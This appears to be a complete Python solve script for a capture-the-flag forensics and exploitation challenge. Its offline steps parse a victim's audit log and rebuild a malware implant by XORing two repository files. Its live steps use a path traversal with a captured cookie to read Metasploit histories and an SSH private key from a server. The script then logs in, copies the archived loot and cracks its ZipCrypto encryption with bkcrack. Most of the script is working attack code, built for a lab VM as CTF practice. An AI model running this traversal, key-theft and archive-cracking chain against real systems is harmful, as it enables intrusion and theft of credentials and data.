#!/usr/bin/env python3
"""
Holmes CTF 2026 - Sherlock 05 "Poisoned Branch" - full solve.

The investigation has two halves. The first half is pure disk forensics on the
victim's UAC collection; the second half is live exploitation of the attacker's
own staging server, which the victim's logs happen to hand us the keys to.

Steps (these numbers are referenced from the writeup's "Attack Method" section):

  1. Parse the victim's auditd log into a readable execve timeline. This yields
     the implant path/pid, the C2 URL:PORT, the operator cookie and the "rm".
  2. Rebuild the implant from the poisoned repo: calibration.bin XOR
     diogenes.jpg (repeating key) == the ELF that was dropped as .integrity.
     Confirms the callback host:port without ever running the malware.
  3. Re-use the attacker's own path traversal (/download?file=../../...) against
     their Flask server, authenticated with the cookie found in step 1, to read
     ~/.msf4/history and ~/.msf4/meterpreter_history.
  4. Pull ~/.ssh/id_rsa through the same traversal and log in as `moran`.
  5. List ~/Exfiltrated_Loot -> LOOT.zip (ZipCrypto) plus a cleartext README.txt.
  6. Known-plaintext attack: the cleartext README.txt on disk is the same file
     that sits encrypted inside LOOT.zip (CRC32 match), so bkcrack recovers the
     internal keys without ever guessing the password.
  7. Unlock the archive, extract the roster PDF, print the REDACTED row.

Usage:
    python3 solve.py 10.129.4.207 [--uac ../../PoisonedBranch/uac_x] [--tom ...]

Requires: bkcrack (brew install bkcrack), poppler (pdftotext), ssh/scp.
"""

import argparse
import re
import subprocess
import sys
import zlib
import zipfile
from collections import OrderedDict
from datetime import datetime, timezone
from pathlib import Path

OPERATOR_COOKIE = "X-Operator-Auth=napoleon_moran_1894"
C2_VHOST = "BlackPearl2026.htb"
C2_PORT = 9999

WORKDIR = Path(__file__).resolve().parent
LOOT_DIR = WORKDIR / "loot"


# ---------------------------------------------------------------------------
# Step 1 - auditd timeline
# ---------------------------------------------------------------------------

def audit_execve_timeline(audit_log: Path):
    """Pair each EXECVE record with the SYSCALL/CWD records of the same event id.

    auditd splits one process launch across several records that only share the
    ":<serial>" part of the msg=audit(...) field, so the args (EXECVE) and the
    pid/ppid (SYSCALL) have to be stitched back together by that serial.
    """
    events = OrderedDict()
    for line in audit_log.read_text(errors="replace").splitlines():
        header = re.match(r"type=(\S+) msg=audit\(([\d.]+):(\d+)\):\s*(.*)", line)
        if not header:
            continue
        record_type, epoch, serial, body = header.groups()
        events.setdefault(serial, {"epoch": float(epoch), "records": []})
        events[serial]["records"].append((record_type, body))

    timeline = []
    for serial, event in events.items():
        execve = [body for kind, body in event["records"] if kind == "EXECVE"]
        if not execve:
            continue

        argv = []
        for arg in re.finditer(r'a(\d+)=(?:"([^"]*)"|([0-9A-Fa-f]+))', execve[0]):
            quoted, hex_encoded = arg.group(2), arg.group(3)
            # auditd hex-encodes any argument containing spaces or quotes.
            argv.append(quoted if quoted is not None else
                        bytes.fromhex(hex_encoded).decode("utf-8", "replace"))

        syscall = next((b for k, b in event["records"] if k == "SYSCALL"), "")
        cwd = next((b for k, b in event["records"] if k == "CWD"), "")
        pick = lambda pattern, text: (re.search(pattern, text) or [None, ""])[1]

        timeline.append({
            "serial": serial,
            "when": datetime.fromtimestamp(event["epoch"], timezone.utc),
            "pid": pick(r"\bpid=(\d+)", syscall),
            "ppid": pick(r"\bppid=(\d+)", syscall),
            "cwd": pick(r'cwd="([^"]*)"', cwd),
            "argv": " ".join(argv),
        })
    return timeline


def report_victim_side(uac_root: Path):
    audit_log = uac_root / "[root]/var/log/audit/audit.log"
    if not audit_log.is_file():
        print(f"[!] no audit.log under {uac_root}, skipping step 1")
        return

    timeline = audit_execve_timeline(audit_log)
    interesting = ("ticket_parser.py", ".integrity", "wget", "rm ", "git clone http")
    print("[*] Step 1 - attacker-relevant execve records")
    for entry in timeline:
        if any(needle in entry["argv"] for needle in interesting):
            print(f"    {entry['when']:%m-%d %H:%M:%S} pid={entry['pid']:>5} "
                  f"ppid={entry['ppid']:>5} cwd={entry['cwd']}\n"
                  f"        {entry['argv']}")


# ---------------------------------------------------------------------------
# Step 2 - reconstruct the implant from the poisoned repository
# ---------------------------------------------------------------------------

def xor_repeating(first: bytes, second: bytes) -> bytes:
    """Same primitive the dropper uses: XOR, cycling the shorter operand."""
    longer, shorter = (first, second) if len(first) >= len(second) else (second, first)
    return bytes(b ^ shorter[i % len(shorter)] for i, b in enumerate(longer))


def rebuild_implant(repo_root: Path):
    package = repo_root / "src/ticket_parser"
    carrier_image = package / "diogenes.jpg"
    encrypted_payload = package / "calibration.bin"
    if not encrypted_payload.is_file():
        print(f"[!] {encrypted_payload} missing, skipping step 2")
        return

    implant = xor_repeating(carrier_image.read_bytes(), encrypted_payload.read_bytes())
    out = WORKDIR / "rebuilt_implant.elf"
    out.write_bytes(implant)

    # The mettle payload keeps its callback URI as a plain argv string, so a
    # grep over the decrypted bytes is enough to recover host and port.
    callback = re.search(rb"tcp://[\w.\-]+:\d+", implant)
    print(f"[*] Step 2 - implant rebuilt: {len(implant)} bytes, magic={implant[:4]!r}")
    print(f"    callback: {callback.group().decode() if callback else 'not found'}")


# ---------------------------------------------------------------------------
# Steps 3-4 - path traversal against the attacker's Flask server
# ---------------------------------------------------------------------------

def traversal_fetch(target_ip: str, relative_path: str) -> bytes:
    """GET /download?file=<path> with the operator cookie.

    --resolve pins the attacker's vhost to the spawned VM so the request looks
    exactly like the one in the victim's audit log, with no /etc/hosts edit.
    """
    url = f"http://{C2_VHOST}:{C2_PORT}/download?file={relative_path}"
    result = subprocess.run(
        ["curl", "-s", "--max-time", "20",
         "--resolve", f"{C2_VHOST}:{C2_PORT}:{target_ip}",
         "-H", f"Cookie: {OPERATOR_COOKIE}", url],
        capture_output=True, check=True)
    return result.stdout


def loot_operator_history(target_ip: str):
    print("[*] Step 3 - operator command history via path traversal")
    for artifact in (".msf4/history", ".msf4/meterpreter_history"):
        body = traversal_fetch(target_ip, f"../../{artifact}").decode(errors="replace")
        print(f"    --- ~/{artifact} ---")
        print("".join(f"        {line}\n" for line in body.splitlines()))


def steal_ssh_key(target_ip: str) -> Path:
    print("[*] Step 4 - stealing moran's SSH private key")
    key_path = WORKDIR / "moran_id_rsa"
    key_path.write_bytes(traversal_fetch(target_ip, "../../.ssh/id_rsa"))
    key_path.chmod(0o600)
    return key_path


# ---------------------------------------------------------------------------
# Step 5 - pull the loot over SSH
# ---------------------------------------------------------------------------

def ssh(key_path: Path, target_ip: str, command: str) -> str:
    return subprocess.run(
        ["ssh", "-i", str(key_path), "-o", "StrictHostKeyChecking=no",
         "-o", "UserKnownHostsFile=/dev/null", "-o", "BatchMode=yes",
         f"moran@{target_ip}", command],
        capture_output=True, text=True, check=True).stdout


def fetch_loot(key_path: Path, target_ip: str):
    print("[*] Step 5 - contents of ~/Exfiltrated_Loot")
    print(ssh(key_path, target_ip, "ls -la ~/Exfiltrated_Loot"))
    for name in ("LOOT.zip", "README.txt"):
        subprocess.run(
            ["scp", "-q", "-i", str(key_path), "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null",
             f"moran@{target_ip}:~/Exfiltrated_Loot/{name}", str(WORKDIR / name)],
            check=True)


# ---------------------------------------------------------------------------
# Step 6 - ZipCrypto known-plaintext attack
# ---------------------------------------------------------------------------

def recover_zip_keys(archive: Path, plaintext: Path) -> list[str]:
    entry = zipfile.ZipFile(archive).getinfo(plaintext.name)
    disk_crc = zlib.crc32(plaintext.read_bytes())
    if disk_crc != entry.CRC:
        raise SystemExit(f"[!] CRC mismatch ({disk_crc:#x} != {entry.CRC:#x}); "
                         "the cleartext copy is not the zipped one")
    print(f"[*] Step 6 - CRC32 {entry.CRC:#010x} matches, known plaintext confirmed")

    # bkcrack needs the *compressed* bytes for a deflated entry, so reproduce the
    # deflate stream locally. Every zlib level emits the same 76 bytes here.
    deflated = WORKDIR / "known_plaintext.deflate"
    compressor = zlib.compressobj(6, zlib.DEFLATED, -15)
    deflated.write_bytes(compressor.compress(plaintext.read_bytes()) + compressor.flush())

    attack = subprocess.run(
        ["bkcrack", "-C", str(archive), "-c", plaintext.name, "-p", str(deflated)],
        capture_output=True, text=True, check=True).stdout
    keys = re.search(r"^([0-9a-f]{8}) ([0-9a-f]{8}) ([0-9a-f]{8})$", attack, re.M)
    if not keys:
        raise SystemExit("[!] bkcrack found no keys:\n" + attack)
    print(f"    internal keys: {' '.join(keys.groups())}")
    return list(keys.groups())


def unlock_and_extract(archive: Path, keys: list[str]):
    opened = WORKDIR / "LOOT_open.zip"
    subprocess.run(["bkcrack", "-C", str(archive), "-k", *keys,
                    "-U", str(opened), "infected"], check=True, capture_output=True)
    LOOT_DIR.mkdir(exist_ok=True)
    zipfile.ZipFile(opened).extractall(LOOT_DIR, pwd=b"infected")
    print(f"[*] extracted to {LOOT_DIR}: {[p.name for p in LOOT_DIR.iterdir()]}")


# ---------------------------------------------------------------------------
# Step 7 - answers
# ---------------------------------------------------------------------------

def report_roster():
    pdf = LOOT_DIR / "Gov_HR_Continuity_Emergency_Callout_Roster.pdf"
    text = subprocess.run(["pdftotext", "-layout", str(pdf), "-"],
                          capture_output=True, text=True, check=True).stdout
    print("[*] Step 7 - roster row whose Position is redacted")
    for line in text.splitlines():
        if "REDACTED" in line:
            print(f"    {' '.join(line.split())}")

    credentials = LOOT_DIR / "cvoss_exfil"
    if credentials.is_file():
        print(f"    bonus - cvoss_exfil: {credentials.read_text().strip()}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("target_ip", nargs="?", help="spawned VM address")
    parser.add_argument("--uac", default="../../PoisonedBranch/uac_x")
    parser.add_argument("--tom", default="../../PoisonedBranch/Tom_x/home/Tom/"
                                         "Projects/diogenes-ticket-parser")
    args = parser.parse_args()

    report_victim_side((WORKDIR / args.uac).resolve())
    rebuild_implant((WORKDIR / args.tom).resolve())

    if not args.target_ip:
        print("[*] no target ip given, offline half only")
        return 0

    loot_operator_history(args.target_ip)
    key_path = steal_ssh_key(args.target_ip)
    fetch_loot(key_path, args.target_ip)
    keys = recover_zip_keys(WORKDIR / "LOOT.zip", WORKDIR / "README.txt")
    unlock_and_extract(WORKDIR / "LOOT.zip", keys)
    report_roster()
    return 0


if __name__ == "__main__":
    sys.exit(main())
